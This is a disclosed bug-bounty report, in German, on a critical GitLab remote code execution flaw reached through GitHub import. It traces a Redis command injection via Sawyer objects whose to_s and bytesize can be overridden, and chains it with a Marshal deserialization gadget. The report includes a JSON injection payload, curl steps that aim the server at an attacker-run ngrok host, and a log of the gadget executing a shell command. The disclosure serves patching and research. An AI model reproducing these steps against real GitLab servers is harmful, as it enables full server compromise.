# [[Remote Command Execution via Github import]]

## Target

Reported to: GitLab
Disclosed: October 6, 2022, 8:19pm UTC
Severity: Critical (9.9)
Weakness: Command Injection - Generic
Bounty: $33,510
CVE ID: CVE-2022-2884
Account details: None

### Summary

Das ist sehr ähnlich zu 
https://about.gitlab.com/releases/2022/08/22/critical-security-release-gitlab-15-3-1-released/#Remote%20Command%20Execution%20via%20Github%20import 
und ermöglicht das Einfügen beliebiger Redis-Befehle beim Import eines GitHub-Repositorys.

Beim Import eines GitHub-Repos verwendet der [[API]]-Client Sawyer für den Umgang mit den Antworten. 
Dies nimmt einen JSON-Hash und konvertiert ihn in eine Ruby-Klasse mit Methoden, die allen Schlüsseln entsprechen:

https://github.com/lostisland/sawyer/blob/v0.9.2/lib/sawyer/resource.rb#L106-L110

```ruby

    def self.attr_accessor(*attrs)
      attrs.each do |attribute|
        class_eval do
          define_method attribute do
            @attrs[attribute.to_sym]
          end

          define_method "#{attribute}=" do |value|
            @attrs[attribute.to_sym] = value
          end

          define_method "#{attribute}?" do
            !!@attrs[attribute.to_sym]
          end
        end
      end
    end

```

Dies geschieht rekursiv und ermöglicht das Überschreiben jeder Methode, einschließlich integrierter Methoden wie `to_s`.

Das Redis-Gem verwendet `to_s` und `bytesize` um den RESP-Befehl zu generieren, also wenn ein `Sawyer::Resource` wird jemals übergeben, 
der einen kontrollierbaren Hash hat. Dadurch können beliebige Redis-Befehle in den Stream eingefügt werden, 
da die Zeichenfolge kürzer ist als die `$` mitgelieferte Größe (siehe https://redis.io/docs/reference/protocol-spec/)

https://github.com/redis/redis-rb/blob/v4.4.0/lib/redis/connection/command_helper.rb#L20

```ruby

            i = i.to_s
            command << "$#{i.bytesize}"
            command << i

```

Der Patch für CVE-2022-2884 Validierung hinzugefügt `Gitlab::Cache::Import::Caching` 
aber es gibt noch einen anderen Ort, an dem  `Sawyer::Resource` wird an Redis übergeben:

https://gitlab.com/gitlab-org/gitlab/-/blob/v15.3.1-ee/lib/gitlab/github_import/importer/repository_importer.rb#L55`

```ruby

       def import_repository
          project.ensure_repository

          refmap = Gitlab::GithubImport.refmap
          project.repository.fetch_as_mirror(project.import_url, refmap: refmap, forced: true)

          project.change_head(default_branch) if default_branch

          # The initial fetch can bring in lots of loose refs and objects.
          # Running a `git gc` will make importing pull requests faster.
          Repositories::HousekeepingService.new(project, :gc).execute

          true
        end

```

Das `default_branch` param stammt aus dem Client-Repository (das eine verschachtelte Sawyer::Resource mit von Angreifern kontrollierten Daten ist) 
und wird übergeben an `change_head` was dann anruft `branch_exists?` und `branch_names_include?` was den Wert an Redis übergibt:

https://gitlab.com/gitlab-org/gitlab/-/blob/v15.3.1-ee/lib/gitlab/repository_cache_adapter.rb#L71

```ruby

        define_method("#{name}_include?") do |value|
          ivar = "@#{name}_include"
          memoized = instance_variable_get(ivar) || {}
          lookup = proc { __send__(name).include?(value) } # rubocop:disable GitlabSecurity/PublicSend

          next memoized[value] if memoized.key?(value)

          memoized[value] =
            if strong_memoized?(name)
              lookup.call
            else
              result, exists = redis_set_cache.try_include?(name, value)

              exists ? result : lookup.call
            end

          instance_variable_set(ivar, memoized)[value]
        end

```

Also, indem Sie eine [[API]]-Antwort mit einem zurückgeben default_branch das überschreibt to_s und bytesize Sie können beliebige Redis-Befehle aufrufen:

```json

        {
            "default_branch": {
                "to_s": {
                    "to_s": 'ggg\r\nINJECT_RESP_HERE',
                    "bytesize": 3,
                }
            }
        }

```

Dies kann kombiniert werden mit einem Anruf an Marshal.load beim Laden einer _gitlab_session, 
um ein Deserialisierungs-Gadget auszuführen (wie https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html) und erhalte RCE.

### Steps to reproduce

	1.  Bearbeite gen_payload3.rb (F1882976) und ändere den Befehl unter `git_set`, das wird der Befehl sein, der ausgeführt wird.
	2.  Ändere die `session:gitlab:gggg` zu etwas anderem als `gggg`.
	3.  Starte `ruby ./gen_payload3.rb` und kopiere die Payload.
	4.  Bearbeite fake_server3.py (F1882972) und aktualisiere die Nutzlast.
	5.  Starte `ngrok http 5000` und kopiere die URL.
	6.  Bearbeite `fake_server3.py` und aktualisiere die Ngrok-URL.
	7.  Starte den Server mit `FLASK_APP=fake_server3.py flask run`.
	8.  Benutze `curl --request POST --url "http://gitlab.wbowling.info/api/v4/import/github" 
	    --header "content-type: application/json" --header "PRIVATE-TOKEN: API_TOKEN" 
	    --data "{\"personal_access_token\": \"fake_token\",\"repo_id\": \"12345\",\"target_namespace\": 
	    \"root\",\"new_name\": \"gh-import-$RANDOM\",\"github_hostname\": \"https://9895-45-248-49-157.ngrok.io\"}"`
	    und ersetze `gitlab.wbowling.info` mit deiner Gitlab-URL, `API_TOKEN` mit einem gültigen Gitlab-Token, 
	    `target_namespace` mit einem Namespace, auf den Sie Zugriff haben. Und `github_hostname` mit deiner Ngrok-URL.
	9.  Warte ungefähr eine Minute und man sollte Anfragen in der Flask-App sehen. 
	    Sobald Sie eine Anfrage für `/api/v3/repos/fake/name` sehen, sollten Sie lange genug gewartet haben. Außerdem wird ein Fehler in 
	    `/var/log/gitlab/gitlab-rails/exceptions_json.log` über `comparison of String with 0 failed` angezeigt.
	10. Benutze `curl -v 'http://gitlab.wbowling.info/root' -H 'Cookie: _gitlab_session=gggg'` 
	    und ersetze `gitlab.wbowling.info` mit deiner Gitlab-URL und `gggg` mit der Zeichenfolge, die du benutzt hast in `gen_payload3.rb`.
	11. Der Payload sollte nun ausgeführt werden.

### Impact

Ermöglicht einem Angreifer, ein Github-Repo zu importieren und beliebige Befehle auf dem Server auszuführen.

### Examples

In den beigefügten Skripten, sind Schritt für Schritt Anleitungen zum Reproduzieren.

### Was ist das momentane *bug* Verhalten?

Das `Sawyer::Resource` Objekt wird weitergegeben und ermöglicht es einem Angreifer, eingebaute Methoden zu überschreiben.

### Was ist das zu erwartende korrigierte Verhalten?

Die `Sawyer::Resource` hat eine `to_h` Methode, die möglicherweise verwendet werden könnte, um sicherzustellen, dass eine Ebene weitergegeben wird.

### Relevante Logs und/oder Screenshots

Der Befehl redis endet wie folgt:

```

[pid  1362] read(67, "*1\r\n$5\r\nmulti\r\n*3\r\n$9\r\nsismember\r\n$53\r\ncache:
gitlab:branch_names:root/gh-import-7316:102:set\r\n$3\r\nggg\r\n*3\r\n$3\r\nset\r\n$19\r\nsession:
gitlab:jjjj\r\n$330\r\n\4\10[\10c\25Gem::SpecFetcherc\23Gem::InstallerU:\25Gem::
Requirement[\6o:\34Gem::Package::TarReader\6:\10@ioo:\24Net::BufferedIO\7;\7o:#Gem::
Package::TarReader::Entry\7:\n@readi\0:\f@headerI\"\10aaa\6:\6ET:\22@debug_outputo:\26Net::
WriteAdapter\7:\f@socketo:\24Gem::RequestSet\7:\n@setso;\16\7;\17m\vKernel:
\17@method_id:\vsystem:\r@git_setI\"\33echo id > /tmp/vakzz22\6;\fT;\22:\
fresolve\r\n*2\r\n$6\r\nexists\r\n$53\r\ncache:gitlab:branch_names
:root/gh-import-7316:102:set\r\n*1\r\n$4\r\nexec\r\n", 16384) = 570

```

Fehler in den Protokollen

```json

{"severity":"ERROR","time":"2022-08-25T03:57:55.006Z","correlation_id":"01GB9JCB7TYNH6F7J7W7NFQTDT",
"exception.class":"ArgumentError","exception.message":"comparison of String with 0 failed",
"exception.backtrace":["lib/gitlab/set_cache.rb:60:in `block in try_include?'",
"lib/gitlab/redis/wrapper.rb:23:in `block in with'","lib/gitlab/redis/wrapper.rb:23:in `with'",
"lib/gitlab/set_cache.rb:74:in `with'","lib/gitlab/set_cache.rb:59:in `try_include?'",
"lib/gitlab/repository_cache_adapter.rb:71:in `block in cache_method_as_redis_set'",
"app/models/repository.rb:288:in `branch_exists?'",
"app/models/repository.rb:1161:in `change_head'",
"app/models/concerns/has_repository.rb:17:in `change_head'",
"lib/gitlab/github_import/importer/repository_importer.rb:55:in `import_repository'",
"lib/gitlab/github_import/importer/repository_importer.rb:37:in `execute'",
"app/workers/gitlab/github_import/stage/import_repository_worker.rb:31:in `import'",
"app/workers/concerns/gitlab/github_import/stage_methods.rb:37:in `try_import'",
"app/workers/concerns/gitlab/github_import/stage_methods.rb:20:in `perform'",
"lib/gitlab/database/load_balancing/sidekiq_server_middleware.rb:26:in `call'",
"lib/gitlab/sidekiq_middleware/duplicate_jobs/strategies/until_executing.rb:16:in `perform'",
"lib/gitlab/sidekiq_middleware/duplicate_jobs/duplicate_job.rb:58:in `perform'",
"lib/gitlab/sidekiq_middleware/duplicate_jobs/server.rb:8:in `call'",
"lib/gitlab/sidekiq_middleware/worker_context.rb:9:in `wrap_in_optional_context'",
"lib/gitlab/sidekiq_middleware/worker_context/server.rb:19:in `block in call'",
"lib/gitlab/application_context.rb:110:in `block in use'","lib/gitlab/application_context.rb:110:in `use'",
"lib/gitlab/application_context.rb:52:in `with_context'","lib/gitlab/sidekiq_middleware/worker_context/server.rb:17:in `call'",
"lib/gitlab/sidekiq_status/server_middleware.rb:7:in `call'","lib/gitlab/sidekiq_versioning/middleware.rb:9:in `call'",
"lib/gitlab/sidekiq_middleware/query_analyzer.rb:7:in `block in call'","lib/gitlab/database/query_analyzer.rb:37:in `within'",
"lib/gitlab/sidekiq_middleware/query_analyzer.rb:7:in `call'","lib/gitlab/sidekiq_middleware/admin_mode/server.rb:14:in `call'",
"lib/gitlab/sidekiq_middleware/instrumentation_logger.rb:9:in `call'",
"lib/gitlab/sidekiq_middleware/batch_loader.rb:7:in `call'","lib/gitlab/sidekiq_middleware/extra_done_log_metadata.rb:7:in `call'",
"lib/gitlab/sidekiq_middleware/request_store_middleware.rb:10:in `block in call'",
"lib/gitlab/with_request_store.rb:17:in `enabling_request_store'","lib/gitlab/with_request_store.rb:10:in `with_request_store'",
"lib/gitlab/sidekiq_middleware/request_store_middleware.rb:9:in `call'",
"lib/gitlab/sidekiq_middleware/server_metrics.rb:76:in `block in call'",
"lib/gitlab/sidekiq_middleware/server_metrics.rb:103:in `block in instrument'",
"lib/gitlab/metrics/background_transaction.rb:33:in `run'","lib/gitlab/sidekiq_middleware/server_metrics.rb:103:in `instrument'",
"lib/gitlab/sidekiq_middleware/server_metrics.rb:75:in `call'","lib/gitlab/sidekiq_middleware/monitor.rb:10:in `block in call'",
"lib/gitlab/sidekiq_daemon/monitor.rb:49:in `within_job'","lib/gitlab/sidekiq_middleware/monitor.rb:9:in `call'",
"lib/gitlab/sidekiq_middleware/size_limiter/server.rb:13:in `call'",
"lib/gitlab/sidekiq_logging/structured_logger.rb:21:in `call'"],"user.username":"root",
"tags.program":"sidekiq","tags.locale":"en","tags.feature_category":"importers",
"tags.correlation_id":"01GB9JCB7TYNH6F7J7W7NFQTDT","extra.sidekiq":{"retry":5,"queue":"github_importer:github_import_stage_import_repository",
"version":0,"queue_namespace":"github_importer","dead":false,"memory_killer_memory_growth_kb":50, 
"memory_killer_max_memory_growth_kb":300000,"status_expiration":1800,"args":["[FILTERED]"], 
"class":"Gitlab::GithubImport::Stage::ImportRepositoryWorker","jid":"f6fd0ce785d6cc8e91b5b776",
"created_at":1661399872.1377518,"correlation_id":"01GB9JCB7TYNH6F7J7W7NFQTDT","meta.caller_id":"RepositoryImportWorker",
"meta.remote_ip":"192.168.0.149","meta.feature_category":"importers","meta.user":"root",
"meta.project":"root/gh-import-7316","meta.root_namespace":"root","meta.client_id":"user/1",
"meta.root_caller_id":"POST /api/:version/import/github","worker_data_consistency":"always",
"idempotency_key":"resque:gitlab:duplicate:github_importer:github_import_stage_import_repository:797f481f035041a27c840a58899f1557fc2a102dfc05bc2cb918651c86da1219",
"size_limiter":"validated","enqueued_at":1661399872.1395159},"extra.import_type":"github","extra.project_id":102,
"extra.source":"Gitlab::GithubImport::Stage::ImportRepositoryWorker"}

```

### Output of checks

#### Ergebnisse der GitLab-Enviorment Info.

```

System information
System:		Ubuntu 20.04
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.7.5p203
Gem Version:	3.1.6
Bundler Version:2.3.15
Rake Version:	13.0.6
Redis Version:	6.2.7
Sidekiq Version:6.4.0
Go Version:	unknown

GitLab information
Version:	15.3.1-ee
Revision:	518311979e3
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	12.10
URL:		http://gitlab.wbowling.info
HTTP Clone URL:	http://gitlab.wbowling.info/some-group/some-project.git
SSH Clone URL:	git@gitlab.wbowling.info:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	14.10.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell

```

## Impact

Ermöglicht einem Angreifer mit der Möglichkeit, ein Github-Repo zu importieren, beliebige Befehle auf dem Server auszuführen.